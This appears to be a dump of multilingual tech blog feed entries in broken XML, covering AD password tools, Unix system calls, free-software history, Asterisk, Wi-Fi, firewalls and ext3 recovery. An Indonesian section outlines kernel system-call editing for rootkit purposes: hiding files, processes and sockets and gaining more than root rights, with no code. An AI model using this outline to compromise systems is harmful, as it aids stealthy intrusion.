gunakan prosedur berikut. Kita harus menggunakan local administrator credentials jika kita menggunakan workstation atau member server tapi harus menggunakan domain administrator credentials kalau kita melakukannya pada domain controller.    Kemudian pastikan juga Remote Server Administration Tools (RSAT) khususnya AD DS administration tools terinstal pada komputer kita.File AcctInfo.dll terdapat dalam satu bundel dalam file ALTools.exe. Setelah mendownload file ALTools.exe, yang berada di sini.       Tempatkan file tersebut pada suatu folder, misalkan c:\Temp, kemudian lakukan ekstrak.                                                         Pada gambar di atas, salah satu file hasil ekstrak adalah file acctinfo.dll. Kita instal file ini dengan    perintah sebagai berikut:             Hingga muncul dialog sebagai berikut, kemudian klik OK:             Buka salah satu user account, lalu pada kotak propertiesnya, pilih tab Additional Account Info, seperti pada gambar berikut:             Setelah di klik button Domain PW Info, akan muncul dialog info sbb:             Domain PW Info menampilkan password policy yang diberlakukan pada account ini.    Sedangkan jika kita klik button Set PW on Site DC (terlihat arahnya pada tanda panah merah di gambar berikut ini) kita bisa melakukan resetting password user. Penggunaan button Set PW On Site DC.. untuk mereset password pada user account dapat menghindari adanya delay serta memberikan cara yang cepat bagi user untuk dapat langsung menggunakan password baru hasil reset ini.         Kita bisa menggunakan button Use the Just Find Site untuk mencari/menemukan site dc dan mereset password.             Dynamic-link library (DLL) ini cukup bermanfaat bagi help desk staff dan juga member dari domain administrators group.   SYSTEM CALLS MANAGEMEN PROSES       System Call untuk managemen proses diperlukan untuk mengatur proses-proses yang sedang berjalan. Kita dapat melihat penggunaan system calls untuk managemen proses pada Sistem Operasi Unix.Contoh yang paling baik untuk melihat bagaimana system call bekerja untuk managemen proses adalah Fork. Fork adalah satusatunya cara untuk membuat sebuah proses baru pada sistem Unix.Fork membuat duplikasi yang mirip dengan proses aslinya, termasuk    file descriptor, register, dan lainnya.   Setelah perintah Fork, child akan mengeksekusi kode yang berbeda dengan parentnya. Bayangkan yang terjadi pada shell. Shell akanmembaca command dari terminal, melakukan fork pada child, menunggu child untuk mengeksekusi command tersebut, dan membaca command    lainnya ketika child terminate.   Untuk menunggu child selesai, parent akan mengeksekusi system call waitpid, yang hanya akan menunggu sampai child selesai. Proses child harus mengeksekusi command yang dimasukkan oleh user(pada kasus shell). Proses child melakukannya dengan menggunakan system call exec.   Dari ilustrasi tersebut kita dapat mengetahui bagaimana system calldipakai untuk managemen proses. Kasus lainnya bukan hanya pada Fork, tetapi hampir setiap proses memerlukan system call untuk melakukan management proses.                               File-file Fungsi Syscall dan Header Syscall       Layaknya pemrograman user interface, pemrograman modul syscallpada kernel OpenBSD juga membutuhkan beberpa file header danfile C source yang sebaiknya dipelajari agar nantinya tidak bingungmembaca modul syscall.        * /usr/src/sys/kern/syscalls.c - berisi tabel nama-nama syscall OpenBSD.   * /usr/src/sys/kern/init_sysent.c - berisi tabel sysent yang menyimpan dua     informasi : Jumlah parameter system call dan fungsi yang menghandle      system call.   * /usr/src/sys/sys/syscallargs.h - berisi list argument system call.   * /usr/src/sys/sys/syscall.h - berisi nomor sistem call       Setelah membaca dan memahami file di atas, sekarang kita bisa memulai mengkode system call, melakukan editing system call dan mengambil keuntungan-keuntungan sekuritas level kernel.       --[7]-- System call Editing for Fun and Profit :)       Sudah dijelaskan sebelumnya bahwa saat kita mengeksekusi sebuahperintah, kita memanggil system call tertentu. Bagaimana jika kita melakukan editing system call? Tentu saja kita bisa mengontrol output dari perintah yang di eksekusi oleh user di sistem itu. Banyak hal yang   bisa dilakukan dengan melakukan editing system call, misalnya:       1. Menyembunyikan file dari perintah 'ls'   2. Menyembunyikan proses   3. Meredireksi ekskusi sebuah file   4. Membuat file yang tidak bisa di delete   5. Membuat proses yang tidak bisa di 'kill'   6. Menyembunyikan socket dari perintah seperti 'netstat'   7. Anda bisa membuat sebuah user yang memiliki pangkat lebih dari root.]]></summary>

  <summary><![CDATA[Todos somos conscientes del escaso índice de incidencia de los virus en sistemas operativos basados en Linux. Su clara separación entre las cuentas de usuario y administrador, así como su menor difusión, permiten a sus usuarios vivir alejados de estos intrusos.  Sin embargo, en ciertas ocasiones nos surge la necesidad de utilizar un antivirus, ya sea para lograr una protección extra o para desinfectar algunos archivos existentes en nuestra partición Windows.  Por otro lado últimamente los paquetes antivirus incorporan nuevas funcionalidades no directamente asociadas con los virus, como serían el firewall, protección anti spyware o antispam.  En cualquier caso, si buscamos un antivirus para Linux los diferentes fabricantes más conocidos ofrecen versiones para los diferentes sistemas operativos como RedHat, Suse, Mandrake (Mandriva), Debian, FreeBSD u OpenBSD.  A modo de ejemplo os ofrecemos dos enlaces donde podréis obtener información más detallada:  - Kaspersky - Anti-Virus for Linux Workstation - Panda Software - Panda Antivirus for Linux  Otra opción sería optar por un antivirus online que se ejecuta a través del navegador web independientemente del sistema operativo.  De momento los móviles parecen el único reducto de hardware que resiste a los virus, aunque los nuevos sistemas operativos para estos dispositivos ya empiezan a mostrar flaqueza.]]></summary>

  <title><![CDATA[Sejarah PL (Perangkat Lunak)]]></title>
  <summary><![CDATA[Sebelum 1983 Komunitas perangkat lunak yang dapat dibandingkan dengan apa yang sekarang dinamakan komunitas perangkat lunak bebas telah lama muncul sebelum munculnya gerakan perangkat lunak bebas dan istilah "perangkat lunak bebas" itu sendiri. Menurut Richard Stallman, komunitas berbagi perangkat lunak di Massachusetts Institute of Technology (MIT) telah ada selama bertahun-tahun sebelum ia bergabung pada 1971.[1] Contoh lain yaitu kelompok pengguna IBM 701, yang bernama SHARE, dan kelompok pengguna Digital Equipment Corporation (DEC), yang bernama DECUS. Pada waktu itu perangkat lunak kebanyakan dibuat oleh kalangan akademisi dan peneliti yang bekerja dalam kolaborasi dan belum dilihat sebagai sebuah komoditi. Sistem operasi seperti versi awal dari UNIX didistribusikan secara luas dan ditangani oleh komunitas. Kode sumber didistribusikan bersamaan dengan perangkat lunaknya karena pengguna-pengguna sering melakukan modifikasi untuk perbaikan bug atau untuk menambahkan fungsi-fungsi baru. Sehingga pada masa tersebut, perangkat lunak dapat disebut sebagai perangkat lunak bebas, bukan karena usaha dari pengguna atau pengembang untuk menjadikannya demikian, tetapi karena perangkat lunak dikembangkan oleh komunitas pengguna.  Versi awal dari UNIX disebarkan secara gratis, tetapi versi awal ini tidak disertai dengan ijin untuk menyebarluaskan atau ijin untuk menyebarkan versi yang dimodifikasi sehingga tidak dapat dikatakan perangkat lunak bebas.  Pada akhir 1970-an dan awal 1980-an, perusahaan-perusahaan memulai membatasi perangkat lunak melalui hak cipta. Hal ini disebabkan karena perangkat lunak-perangkat lunak tersebut berubah menjadi sumber pendapatan sebagai perangkat lunak tak bebas.  Beberapa perangkat lunak bebas dikembangkan sebelum 1983 dan terus digunakan sampai sekarang termasuk TeX dan SPICE.[2]    Dimulainya GNU dan FSF (1983-1990)  Artikel utama untuk bagian ini adalah: Proyek GNU  Pada 1983, Richard Stallman meluncurkan proyek GNU yang bertujuan untuk menulis sebuah sistem operasi yang lengkap dan yang kode sumbernya bebas digunakan oleh siapa saja. Beberapa insiden khusus yang memotivasi hal ini termasuk kasus dimana sebuah pencetak yang tidak bekerja dan tidak bisa diperbaiki penggunanya karena kode sumbernya tidak tersedia[3]. Kasus terakhir adalah sengketa antara Stallman dan Symbolics, Inc.. Tidak lama setelah peluncuran proyek GNU, Stallman mempopulerkan istilah "free software" atau "perangkat lunak bebas" dan mendirikan Yayasan Perangkat Lunak Bebas untuk mempromosikan konsep tersebut. Definisi Perangkat Lunak Bebas kemudian dipublikasikan pada Februari 1986.  Pada 1989, versi pertama dari Lisensi Umum Publik GNU dipulikasikan. Versi 2-nya dipublikasikan pada 1991.  Pada 1989, beberapa pengembang GNU mendirikan perusahaan Cygnus Solutions[4] yang bertujuan untuk menyediakan dukungan komersial atas produk perangkat lunak bebas. Cygnus Solutions akhirnya mengumumkan merger dengan Red Hat pada 15 November 1999.    GNU+Linux (1991-) Pada 1992, sebuah kernel yang dimulai oleh Linus Torvalds pada tahun sebelumnya dirilis sebagai perangkat lunak bebas. Pada waktu itu, proyek GNU telah menghasilkan atau mengintegrasikan semua yang diperlukan sebuah sistem operasi kecuali sebuah kernel. Kombinasi Linux dan sistem GNU menciptakan sistem operasi bebas dan lengkap yang pertama sejak 1983. Lihat pula: Kontroversi penamaan GNU/Linux.    Free BSD (1993-) Pada 1993, FreeBSD dan NetBSD dirilis sebagai perangkat lunak bebas. Keduanya berasal dari 386BSD. OpenBSD kemudian dikembangkan dari NetBSD pada 1995.

  <title><![CDATA[Einevaldsstyrar Richard Stallman kjem til UiB]]></title>
  <summary><![CDATA[Richard Stallman skal 19.februar ha føredrag på Universitetet i Bergen om filosofien bak fri programvare og koss databrukarar kan hjelpast åt om å ta kontroll over si digitale kvardag.  Føredraget er ope for alle.   Meir info: http://www.uib.no/ii/seminar/2009/01/Seminar-med-Richard-Stallman   Kva det elitistiske folket i OpenBSD tykkjer om Stallman: "We are just plain tired of being lectured to by a man who is a lot like Naomi Campbell.  In 1998 when a United Airlines plane was waiting in the queue at Washington Dulles International Airport for take-off to New Orleans (where a Usenix conference was taking place), one man stood up from his seat, demanded that they stop waiting in the queue and be permitted to deplane.  Even after orders from the crew and a pilot from the cockpit he refused to sit down.  The plane exited the queue and returned to the airport gangway.  Security personnel ran onto the plane and removed this man, Richard Stallman, from the plane. After Richard was removed from the plane, everyone else stayed onboard and continued their journey to New Orleans.  A few OpenBSD developers were on that same plane, seated very closeby, so we have an accurate story of the events.  This is the man who presumes that he should preach to us about morality, freedom, and what is best for us.  He believes it is his God-given role to tell us what is best for us, when he has shown that he takes actions which are not best for everyone. He prefers actions which he thinks are best for him -- and him alone -- and then lies to the public.  Richard Stallman is no Spock.  We release our software in ways that are maximally free.  We remove all restrictions on use and distribution, but leave a requirement to be known as the authors.  We follow a pattern of free source code distribution that started in the mid-1980's in Berkeley, from before Richard Stallman had any powerful influence which he could use so falsely.  We have a development sub-tree called "ports".  Our "ports" tree builds software that is 'found on the net' into packages that OpenBSD users can use more easily.  A scaffold of Makefiles and scripts automatically fetch these pieces of software, apply patches as required by OpenBSD, and then build them into nice neat little tarballs.  This is provided as a convenience for users. The ports tree is maintained by OpenBSD entirely separately from our main source tree.  Some of the software which is fetched and compiled is not as free as we would like, but what can we do. All the other operating system projects make exactly the same decision, and provide these same conveniences to their users.  Richard felt that this "ports tree" of ours made OpenBSD non-free. He came to our mailing lists and lectured to us specifically, yet he said nothing to the many other vendors who do the same; many of them donate to the FSF and perhaps that has something to do with it. Meanwhile, Richard has personally made sure that all the official GNU software -- including Emacs -- compiles and runs on Windows.  That man is a false leader.  He is a hypocrite.  There may be some people who listen to him.  But we don't listen to people who do not follow their own stupid rules."]]></summary>

  <title><![CDATA[Asterisk v1.4.19.2 - The Open Source Linux PBX]]></title>
  <summary><![CDATA[What Is Asterisk?    Asterisk is a complete PBX in software. It runs on Linux and provides all of the features you would expect from a PBX and more. Asterisk does voice over IP in three protocols, and can interoperate with almost all standards-based telephony equipment using relatively inexpensive hardware.         Asterisk provides Voicemail services with Directory, Call Conferencing, Interactive Voice Response, Call Queuing. It has support for three-way calling, caller ID services, ADSI, SIP and H.323 (as both client and gateway). Check the Features section for a more complete list.        Asterisk needs no additional hardware for Voice over IP. For interconnection with digital and analog telephony equipment, Asterisk supports a number of hardware devices, most notably all of the hardware manufactured by Asterisk's sponsors, Digium™. Digium has single and quad span T1 and E1 interfaces for interconnection to PRI lines and channel banks as well as a single port FXO card and a one to four-port modular FXS and FXO card.        Also supported are the Internet Line Jack and Internet Phone Jack products from Quicknet.       Asterisk supports a wide range of TDM protocols for the handling and transmission of voice over traditional telephony interfaces. Asterisk supports US and European standard signalling types used in standard business phone systems, allowing it to bridge between next generation voice-data integrated networks and existing infrastructure. Asterisk not only supports traditional phone equipment, it enhances them with additional capabilities.        Using the Inter-Asterisk eXchange (IAX™) Voice over IP protocol, Asterisk merges voice and data traffic seamlessly across disparate networks. While using Packet Voice, it is possible to send data such as URL information and images in-line with voice traffic, allowing advanced integration of information.        Asterisk provides a central switching core, with four APIs for modular loading of telephony applications, hardware interfaces, file format handling, and codecs. It allows for transparent switching between all supported interfaces, allowing it to tie together a diverse mixture of telephony systems into a single switching network.        Asterisk is primarily developed on GNU/Linux for x/86. It is known to compile and run on GNU/Linux for PPC along with OpenBSD, FreeBSD, and Mac OS X Jaguar. Other platforms and standards-based UNIX-like operating systems should be reasonably easy to port for anyone with the time and requisite skill to do so. Asterisk is available in the testing and unstable Debian archives, maintained thanks to Mark Purcell.        Who Made This?        Asterisk was originally written by Mark Spencer of Digium, Inc. Code has been contributed from open source coders around the world, and testing and bug-patches from the community have provided invaluable aid to the development of this software.        Asterisk Architecture        Asterisk is carefully designed for maximum flexibility. Specific APIs are defined around a central PBX core system. This advanced core handles the internal interconnection of the PBX, cleanly abstracted from the specific protocols, codecs, and hardware interfaces from the telephony applications. This allows Asterisk to use any suitable hardware and technology available now or in the future to perform its essential functions, connecting hardware and applications.        The Asterisk core handles these items internally:             PBX      Switching -      The essence of Asterisk, of course, is a Private Branch Exchange Switching      system, connecting calls together between various users and automated      tasks. The Switching Core transparently connects callers arriving on      various hardware and software interfaces.   Application      Launcher -      launches applications which perform services for uses, such as voicemail,      file playback, and directory listing.   Codec      Translator -      uses codec modules for the encoding and decoding of various audio      compression formats used in the telephony industry. A number of codecs are      available to suit diverse needs and arrive at the best balance between      audio quality and bandwidth usage.   Scheduler      and I/O Manager -      handles low-level task scheduling and system management for optimal      performance under all load conditions.       Loadable Module APIs:        Four APIs are defined for loadable modules, facilitating hardware and protocol abstraction. Using this loadable module system, the Asterisk core does not have to worry about details of how a caller is connecting, what codecs are in use, etc.         Channel      API -      the channel API handles the type of connection a caller is arriving on, be      it a VoIP connection, ISDN, PRI, Robbed bit signaling, or some other      technology. Dynamic modules are loaded to handle the lower layer details      of these connections.   Application      API -      the application API allows for various task modules to be run to perform      various functions. Conferencing, Paging, Directory Listing. Voicemail,      In-line data transmission, and any other task which a PBX system might      perform now or in the future are handled by these separate modules.   Codec      Translator API -      loads codec modules to support various audio encoding and decoding formats      such as GSM, Mu-Law, A-law, and even MP3.   File      Format API -      handles the reading and writing of various file formats for the storage of      data in the filesystem.   Using these APIs Asterisk achieves a complete abstraction between its core functions as a PBX server system and the varied technologies existing (or in development) in the telephony arena. The modular form is what allows Asterisk to seamlessly integrate both currently implemented telephony switching hardware and the growing Packet Voice technologies emerging today. The ability to load codec modules allows Asterisk to support both the extremely compact codecs necessary for Packet Voice over slow connections such as a telephone modem while still providing high audio quality over less constricted connections.        The application API provides for flexible use of application modules to perform any function flexibly on demand, and allows for open development of new applications to suit unique needs and situations. In addition, loading all applications as modules allows for a flexible system, allowing the administrator to design the best suited path for callers on the PBX system and modify call paths to suit the changing communication needs of a going concern.        Asterisk Features        Asterisk-based telephony solutions offer a rich and flexible feature set. Asterisk offers both classical PBX functionality and advanced features, and interoperates with traditional standards-based telephony systems and Voice over IP systems. Asterisk offers the features one would expect of a large proprietary PBX system such as Voicemail, Conference Bridging, Call Queuing, and Call Detail Records.        Call Features     ADSI On-Screen      Menu System   Alarm      Receiver   Append      Message   Authentication   Automated      Attendant <span class="Apple-style-span"]]></summary>

  <title><![CDATA[@Kirk McKursick's FreeBSD Internals course]]></title>
  <summary><![CDATA[I had the fortunate pleasure to attend Kirk McKursick's FreeBSD internals course, kindly $upported by Google Switzerland, my employer =).        May the source be with you ...  `:-)   One interesting discussion I had with Kirk was about the behavior of zombie processes with respect to opened sockets and TCP data lingering: he stated that a process could be in zombie state while pushing the data ashes thru an already opened TCP socket ... something that I couldn't agree with, mainly because this would imply a high wait() "latency" in under a pkt loss/congestion scenario.  Linux even has a tcp_max_orphans sysctl explicitly there for this (man 7 tcp), anyhow I wanted to be sure about the behavior of Linux and xBSD, so I coded a quick&dirty test, see zocket.c and Makefile below.   Result: as expected, the sockets were orphaned after the process became zombie, and remained as is (FIN_WAIT1) independently from the process path to death =)  (tested on Linux, FreeBSd and OpenBSD).  As a side note, was interesting to find that in Linux you can push a BPF  down to filter the very data stream, but in FreeBSD you can only hook at the accept() syscall with another mechanism (man 9 accept_filter), this is somewhat 2-sided for Linux: cool that you can arbitrary filter the data stream, notso-cool that you can easily create a local DoS with this power :)  make && make test ## should do the magic:    zocket.c /*  *  zocket.c: connect a socket, block its data stream, write data @children:  *            show zombie and socket lifetime afterwards  *  *  Author: JuanJo: jjo () google com  *  License: GPLv2+  */ #include <stdio.h> #include <unistd.h> #include <stdlib.h> #include <string.h> #include <sys/socket.h> #include <sys/wait.h> #include <netinet/in.h> #include <arpa/inet.h> #include <assert.h> #if __linux__ #include <linux/filter.h> #endif  /* quickie wrapper over syscall error checking */ #define ERR_IF(cond) do { if(cond) { perror( #cond );

  <summary><![CDATA[Så sidder man her på camping, bundet op på et 2G netværk hvor en alm. Hjemmeside tager 5 minutter om at loade. Længe leve RSS, simpel tekst og ingen tunge sider. Hvad ser man så en lille hurtig bemærkning fra en person jeg har den dybeste respekt for Linus Torvald! Personlig kender jeg ikke noget til OpenBSD, andet en et mislykket forsøg på at bootstrappe en installation på et Xen test miljø, men holdningen om at man er begyndt at fokusere for meget på sikkerhed, kan jeg godt følge. Personlig syntes jeg antivirus software er strengt overdrevet, og at firewall er spændene og praktisk, men meget paranoid, ikke at jeg siger at man ikke skal benytte nogle af delene, men at man skal være meget fokuserede på at antivirus software ikke æder mere end selve operativsystemet nogensinde på egen hånd kommer til ar bruge af f.eks. RAM og disk I/O. Hvad var det så Linus sagde, jo han udtalte sig meget åbenmundet om hans personlige mening om at alt fra OpenBSD i hans øjne gå for meget op i sikkerhed, ved at sige:  I think the OpenBSD crowd is a bunch of masturbating monkeys, in that they make such a big deal about concentrating on security to the point where they pretty much admit that nothing else matters to them. To me, security is important. But it's no less important than everything else that is also important.  Jeg læste det første gang her http://newz.dk/linus-torvalds-kalder-openbsd-folk-onanerende-aber?utm_source=newz-dk&utm_medium=rss&utm_campaign=rss#   Jeg holder meget af folk der tør sige hvad de virkelig mener, og Linus udtalelse fik et lille smil frem på mine læber her i det buldrende forteltet, ved den jyske vestkyst. For resten en anden lille sjov ting fra Linus der også er ferieramt kan læses her http://lwn.net/Articles/290498/  De bedste ferie hilsner Dennis]]></summary>

  <title><![CDATA[Wi-Fi technical information]]></title>
  <summary><![CDATA[How it works  Wi-Fi networks use radio technologies called IEEE 802.11 to provide secure, reliable, fast wireless connectivity. A typical Wi-Fi set-up includes one or more access points (APs) and one or more clients. An AP broadcasts its SSID (service set identifier, or "network name") via packets that are called beacons, which are usually broadcast every 100 ms. The beacons are transmitted at 1 Mbit/s, and are of relatively short duration and therefore do not have a significant effect on performance. Since 1 Mbit/s is the lowest rate of Wi-Fi it assures that the client that receives the beacon can communicate at at least 1 Mbit/s. Based on the settings, the client may decide whether to connect to an AP. If two APs of the same SSID are in range of the client, the client firmware might use signal strength to decide with which of the two APs to make a connection.  The Wi-Fi standard leaves connection criteria and roaming totally open to the client. This is a strength of Wi-Fi, but also means that one wireless adapter may perform substantially better than another. Since Wi-Fi transmits in the air, it has the same properties as a non-switched wired Ethernet network, and therefore collisions can occur. Unlike a wired Ethernet, and like most packet radios, Wi-Fi cannot detect collisions, and instead uses an acknowledgment packet for every data packet sent. If a sender receives no acknowledgement within a certain time, the sender retransmits the corresponding packet. Also, a medium reservation protocol can be used when excessive collisions are experienced or expected (request-to-send and clear-to-send used for collision avoidance or CA) in an attempt to avoid collisions.  A Wi-Fi network can be used to connect computers to each other, to the Internet, and to wired networks (which use IEEE 802.3 or Ethernet). Wi-Fi networks operate in the unlicensed 2.4 GHz (802.11b/g/n) and 5 GHz (802.11a/n) radio bands, with an 11 Mbit/s (802.11b) or 54 Mbit/s (802.11a or g) data rate. They can provide real-world performance similar to that of the basic 10BASE-T wired Ethernet networks.  Channels      See also: List of WLAN channels  Except for 802.11a, which only operates at 5 GHz, and 802.11n, which optionally operates at 5 GHz, Wi-Fi devices historically have primarily used the spectrum in 2.4 GHz, which is standardized and unlicensed by international agreement, although the exact frequency allocations and maximum permitted power vary slightly in different parts of the world. Channel numbers, however, are standardized by frequency throughout the world, so authorized frequencies can be identified by channel numbers. The 2.4 GHz band is also used by microwave ovens, Bluetooth devices, amateur radio, legal domestic video senders, security systems (including cordless CCTV), also (in North America) cordless phones and baby monitors.  The maximum number of available channels for Wi-Fi enabled devices are:      * 11 for North America. Only channels 1, 6, and 11 are recommended for 802.11b/g to minimize interference from adjacent channels.[3] (Note: In Mexico channels 1 through 8 are reserved "for indoor use only")     * 13 for China and most countries in Europe. A typical channel layout for 802.11b would be 1/7/13. For traffic that is predominantly 802.11g, 1/5/9/13 provides a fourth frequency enabling a much better frequency plan. (Note: In France only channels 10 through 13 are available. A change for EU harmonization is pending.)     * 14 for Japan.[4]      * 7 for Israel (only channels 3 through 9 are permitted)  There are also restrictions on power levels and permitted antenna types which vary by country.[4]  In some countries, such as the United States, licensed Amateur Radio operators may use some of the channels at much higher power for very long distance wireless access. Such extended range operation is referred to as High Speed Multimedia Radio.  Wi-Fi on various operating systems  There are two sides to Wi-Fi support under an operating system: driver level support, and configuration and management support.  Driver support is usually provided by multiple manufacturers of the chip set hardware or end manufacturers. Also available are Unix clones such as Linux and FreeBSD, sometimes through open source projects.  Configuration and management support consists of software to enumerate, join, and check the status of available Wi-Fi networks. This also includes support for various encryption methods. These systems are often provided by the operating system backed by a standard driver model. In most cases, drivers emulate an ethernet device and use the configuration and management utilities built into the operating system. In cases where built in configuration and management support is non-existent or inadequate, hardware manufacturers may include their own software to handle the respective tasks.  Microsoft Windows  Microsoft Windows has comprehensive driver-level support for Wi-Fi, the quality of which depends on the hardware manufacturer. Hardware manufactures almost always ship Windows drivers with their products. Windows ships with very few Wi-Fi drivers and depends on the original equipment manufacturers (OEMs)and device manufacturers to make sure users get drivers. Configuration and management depend on the version of Windows.      * Earlier versions of Windows, such as 98, ME and 2000 do not have built-in configuration and management support and must depend on software provided by the manufacturer     * Microsoft Windows XP has built-in configuration and management support. The original shipping version of Windows XP included rudimentary support which was dramatically improved in Service Pack 2. Support for WPA2 and some other security protocols require updates from Microsoft. There are still problems with XP support of Wi-Fi. (One simple interface problem is that if the user makes a mistake in the (case sensitive) passphrase, XP keeps trying to connect but never tells the user that the passphrase is wrong. A second problem is not allowing the user to see different BSSID's for the same ESSID; that is, it provides no way for the user to differentiate access points with the same name.) To make up for Windows’ inconsistent and sometimes inadequate configuration and management support, many hardware manufacturers include their own software and require the user to disable Windows’ built-in Wi-Fi support.     * Microsoft Windows Vista has improved Wi-Fi support over Windows XP. The original betas automatically connected to unsecured networks without the user’s approval. The release candidate (RC1 or RC2) does not continue to display this behavior, requiring user permissions to connect to an unsecured network, as long as the user account is in the default configuration with regards to User Account Control.  Mac OS X and classic Mac OS  Apple was an early adopter of Wi-Fi, introducing its AirPort product line, based on the 802.11b standard, in July 1999. Apple later introduced AirPort Extreme, an implementation of 802.11g. All Apple computers, starting with the original iBook in 1999, either included AirPort 802.11 networking or were designed specifically to provide 802.11 networking with only the addition of the internal AirPort Card (or, later, an AirPort Extreme Card), connecting to the computer's built-in antennae. All Intel-based Macs either come with built-in AirPort Extreme or a slot for an AirPort card, and all portable Macs (all MacBooks and the earlier iBooks and PowerBooks) have included Wi-Fi for several years. In late 2006, Apple began shipping Macs with Broadcom Wi-Fi chips that also supported the Draft 802.11n standard, but this capability was disabled and Apple did not claim or advertise the hardware's capability until some time later when the draft had progressed further. At the January 2007 Macworld Expo, Apple announced that their computers would begin shipping with Draft 802.11n support. Systems shipped with this hidden capability can easily be unlocked through software, but due to the accounting requirements of Sarbanes-Oxley, Apple cannot freely add features to already-sold hardware and so must nominally sell an upgrade. This "upgrade" is included in the price of an AirPort Extreme Base Station for all computers owned by the purchaser, and Apple sells the "upgrade" separately (as the "AirPort Extreme 802.11n Enabler for Mac") for about US$2 in the United States and at similar prices elsewhere.  Apple produces the operating system, the computer hardware, the accompanying drivers, AirPort Wi-Fi base stations, and configuration and management software, simplifying Wi-Fi integration, set-up, and maintenance (including security updates). The built-in configuration and management is integrated throughout many of the operating system's applications and utilities. Mac OS X has Wi-Fi support, including WPA2, and ships with drivers for all of Apple’s current and past AirPort Extreme and AirPort cards. Many third-party manufacturers make compatible hardware along with the appropriate drivers which work with Mac OS X’s built-in configuration and management software. Other manufacturers distribute their own software.  Apple's older Mac OS 9 supported AirPort and AirPort Extreme as well, and drivers exist for other equipment from other manufacturers, providing Wi-Fi options for earlier systems not designed for AirPort cards. Versions of Mac OS before Mac OS 9 predate Wi-Fi and do not have any Wi-Fi support, although some third-party hardware manufacturers have made drivers and connection software that allows earlier OSes to use Wi-Fi.[5]  Open source Unix-like systems  Linux, FreeBSD and similar Unix-like clones have much coarser support for Wi-Fi. Due to the open source nature of these operating systems, many different standards have been developed for configuring and managing Wi-Fi devices. The open source nature also fosters open source drivers which have enabled many third party and proprietary devices to work under these operating systems. See Comparison of Open Source Wireless Drivers for more information on those drivers.      * Linux has patchy Wi-Fi support.[6] Native drivers for many Wi-Fi chipsets are available either commercially or at no cost,[7] although some manufacturers don't produce a Linux driver, only a Windows one. Consequently, many popular chipsets either don't have a native Linux driver at all, or only have a half-finished one. For these, the freely available NdisWrapper and its commercial competitor DriverLoader allow Windows x86 and 64 bit variants NDIS drivers to be used on x86-based Linux systems but not on other architectures.[8] As well as the lack of native drivers, some Linux distributions do not offer a convenient user interface and configuring Wi-Fi on them can be a clumsy and complicated operation compared to configuring wired Ethernet drivers.[9] This is changing with NetworkManager, a utility that allows users to automatically switch between networks without using the command line.      * FreeBSD has Wi-Fi support similar to Linux. Support under FreeBSD is best in the 6.x versions, which introduced full support for WPA and WPA2, although in some cases this is driver dependent. FreeBSD comes with drivers for many wireless cards and chipsets, including those made by Atheros, Ralink, Cisco, D-link, Netgear, and many Centrino chipsets, and provides support for others through the ports collection. FreeBSD also has "Project Evil", which provides the ability to use Windows x86 NDIS drivers on x86-based FreeBSD systems as NdisWrapper does on Linux, and Windows amd64 NDIS drivers on amd64-based systems.      * NetBSD, OpenBSD, and DragonFly BSD have Wi-Fi support similar to FreeBSD. Code for some of the drivers, as well as the kernel framework to support them, is mostly shared among the 4 BSDs.      * Haiku has no Wi-Fi support at all as of April 2007.      * Solaris and OpenSolaris have the Wireless Networking Project to provide Wi-Fi drivers and support.

  <title><![CDATA[Redundante fail-over firewall]]></title>
  <summary><![CDATA[In opdracht van een van onze klanten, werd een redundante firewall-oplossing op maat gebouwd, op basis van eenvoudige, prijsgunstige, standaard hardware, met OpenBSD Unix technologie. 
 
Deze internationale KMO heeft een al wat minder alledaagse topologie voor hun netwerk die meer eisen stelt dan wat een gemiddelde KMO nodig heeft, en waardoor een implementatie op maat verantwoord is. 
 
Om de informatica infrastructuur te laten functioneren in functie van de bijna dagelijkse evoluerende noden, bleek de keuze voor de functionaliteit van een pure firewall op basis van open technologieën, dan ook een goede keuze. 
Tezelfdertijd vormt deze firewall een centraal, kritisch punt in de infrastructuur, waardoor een een hoge beschikbaarheid ten zeerste gewenst is. De gekozen technologie geeft dan ook een ideale oplossing, om deze firewall redundant uit te bouwen: volledig ontdubbelde hardware, voorzien van software die standaard kan geprogrammeerd worden om een transparante fail-over mogelijk te maken, en dit zowel op het niveau van de pure statefull firewall functie (pakket filter) als voor het bedienen van de diverse VPN-tunnels. 
Bij de uitval van een firewall, blijft dit alles, transparant voor de gebruiker, verder functioneren. De tweede firewall neemt dan gewoon alle functies over van de eerste. 
Deze oplossing bestaat uit twee autonome hardware firewalls, voor een aankoopprijs die slechts het niveau van een klassieke, niet redundante, propriëtaire zwarte (of rode) doos evenaart. Hier komen geen extra licentie kosten voor extra functionaliteiten, noch voor uitbreiding van aantal gebruikers. De implementatiekost blijft, net zoals voor iedere installatie, in functie van de complexiteit.]]></summary>

  <title><![CDATA[Recuperar datos en GNU/Linux (ext3)]]></title>
  <summary><![CDATA[Actualización: Según me reporta el lector zcgt21 hay dos modos de recuperar particiones enteras y es mediante los Live CDs o USBs autoarrancables, R.I.P. ( Recovery Is Possible) y PartedMagic, ambos con licencia GPL. 
No sé si será extrapolable al sistema de ficheros ext2 pero al menos en ext3 funciona. 
Si algún día tenemos problemas en alguna partición de nuestra sistema GNU/Linux o hemos borrado archivos que queremos recuperar y no hemos hecho copias de seguridad de nuestro disco duro, ya tenemos como solucionarlo. 
Nota: El tutorial está explicado para Debian, FreeBSD, OpenBSD y Gentoo aunque sería similar en Ubuntu o similares y, compilando la utilidad, en otra distro de GNU/Linux. 
Es tan sencillo como arrancar desde nuestro sistema o, en el caso de no poder arrancar, acceder por un Live CD. 
A continuación, copias el disco duro entero en un archivo. Es importante que no tengáis limitación de tamaño por archivos donde lo copiéis, es decir, nada de FAT32 o similares. Lo copiaríamos del siguiente modo: 
dd if=/dev/sda1 of=/media/sda2/archivo.dd
donde /dev/sda1 es el disco duro a copiar y /media/sda2 el disco duro que tenemos montado donde queremos copiar el archivo. 
A continuación instalamos la aplicación que se encuentra en la web http://www.sleuthkit.org/autopsy/  en Debian o intentamos esa versión en Ubuntu. 
Después ejecutamos esa aplicación con usuario root: 
sudo autopsy
Ahora entramos con nuestro navegador en http://localhost:9999/autopsy 
Creamos un nuevo caso y damos a “add image” seleccionando el archivo de nuestra imagen, grabado en /media/sda2/archivo.dd 
Seleccionamos “Analize” y luego “File Analysis“. A medida que el análisis va pasando, podemos ver los archivos que hemos borrado y, en su caso, recuperarlo. 
Luego sólo nos queda borrar el archivo archivo.dd y listo, a arrancar de modo normal

  <title><![CDATA[Dual/Multi boot or Virtualbox?]]></title>
  <summary><![CDATA[When deciding to use more than one OS on one computer it can be of value to know that there is more than one option. This article is based on personal preferences of typist of this weblog. 
